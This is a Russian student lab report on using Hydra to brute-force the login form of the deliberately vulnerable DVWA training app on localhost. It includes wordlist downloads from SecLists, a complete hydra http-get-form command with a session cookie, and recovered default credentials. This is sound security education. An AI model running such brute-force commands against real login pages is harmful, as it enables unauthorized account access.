---
## Front matter
title: "Индивидуальный проект. Этап 3"
subtitle: ""
author: "Матюхин Григорий Васильевич"

## Generic otions
lang: ru-RU
toc-title: "Содержание"

## Bibliography
bibliography: bib/cite.bib
csl: pandoc/csl/gost-r-7-0-5-2008-numeric.csl

## Pdf output format
toc: true # Table of contents
toc-depth: 2
lof: true # List of figures
lot: true # List of tables
fontsize: 12pt
linestretch: 1.5
papersize: a4
documentclass: scrreprt
## I18n polyglossia
polyglossia-lang:
  name: russian
  options:
	- spelling=modern
	- babelshorthands=true
polyglossia-otherlangs:
  name: english
## I18n babel
babel-lang: russian
babel-otherlangs: english
## Fonts
mainfont: IBM Plex Serif
romanfont: IBM Plex Serif
sansfont: IBM Plex Sans
monofont: IBM Plex Mono
mathfont: STIX Two Math
mainfontoptions: Ligatures=Common,Ligatures=TeX,Scale=0.94
romanfontoptions: Ligatures=Common,Ligatures=TeX,Scale=0.94
sansfontoptions: Ligatures=Common,Ligatures=TeX,Scale=MatchLowercase,Scale=0.94
monofontoptions: Scale=MatchLowercase,Scale=0.94,FakeStretch=0.9
mathfontoptions:
## Biblatex
biblatex: true
biblio-style: "gost-numeric"
biblatexoptions:
  - parentracker=true
  - backend=biber
  - hyperref=auto
  - language=auto
  - autolang=other*
  - citestyle=gost-numeric
## Pandoc-crossref LaTeX customization
figureTitle: "Рис."
tableTitle: "Таблица"
listingTitle: "Листинг"
lofTitle: "Список иллюстраций"
lotTitle: "Список таблиц"
lolTitle: "Листинги"
## Misc options
indent: true
header-includes:
  - \usepackage{indentfirst}
  - \usepackage{float} # keep figures where there are in the text
  - \floatplacement{figure}{H} # keep figures where there are in the text
---

# Цель работы

Использование Hydra

- Hydra используется для подбора или взлома имени пользователя и пароля.
- Поддерживает подбор для большого набора приложений.

# Выполнение лабораторной работы

Будем подбирать пароль для уязвимости "Brute Force" в DVWA с низким (low) уровнем безопастности.

## Получить словари имен пользователей и паролей

Возьмем данные из [SecLists](https://github.com/danielmiessler/SecLists).

Пароли:
```bash
$ wget https://raw.githubusercontent.com\
    /danielmiessler/SecLists/refs/heads/master\
    /Passwords/Common-Credentials/common-passwords-win.txt
```

Имена пользователей:
```bash
$ wget https://raw.githubusercontent.com\
    /danielmiessler/SecLists/refs/heads/master\
    /Usernames/cirt-default-usernames.txt
```

## Изучим цель взлома

При низком уровне безопастности форма для подбора отправляет один `GET` запрос на
`/vulnerabilities/brute/?username=<USERNAME>&password=<USERNAME>&Login=Login`.

При успехе на странице появляется текст "Welcome to the password protected area".

Но задачу усложняет тот факт, что нам необходимо быть залогиненым в DVWA,
чтобы иметь доступ к этому эндпоинту.
Поэтому прейдем туда и зайдем с именем `amdin` и паролем `password`.
Нам нужно значение Cookie `PHPSESSID`, которое мы можем взять из хранилища браузера.
Также нам нужно установить Cookie `security` в значение `low`,
чтобы приложение использовало эту настройку безопастности.

## Выполнение атаки

Составим команду для атаки на веб приложение и запустим ее:

```bash
$ hydra \
    -L cirt-default-usernames.txt \
    -P common-passwords-win.txt \
    -o ./brute.log \
    -R \
    -s 4280 127.0.0.1 \
    http-get-form \
    "/vulnerabilities/brute/:\
    username=^USER^&password=^PASS^&Login=Login:\
    H=Cookie\: security=low;PHPSESSID=68359d81ce7b2ad7cbd0079cb3336560:\
    S=Welcome to the password protected area"
```

Команда будет работать достаточно долго, но будет писать найденные комбинации в файл `brute.log`.
На момент написания этого отчета команда все еще не закончила выполняться,
но некоторые комбинации уже были найдены.

Например:
- `admin`, `password`
- `ADMIN`, `password`
- `Admin`, `password`

# Выводы

На данном этапе проекта я научился пользоваться `hydra` для подбора паролей к веб приложениям.
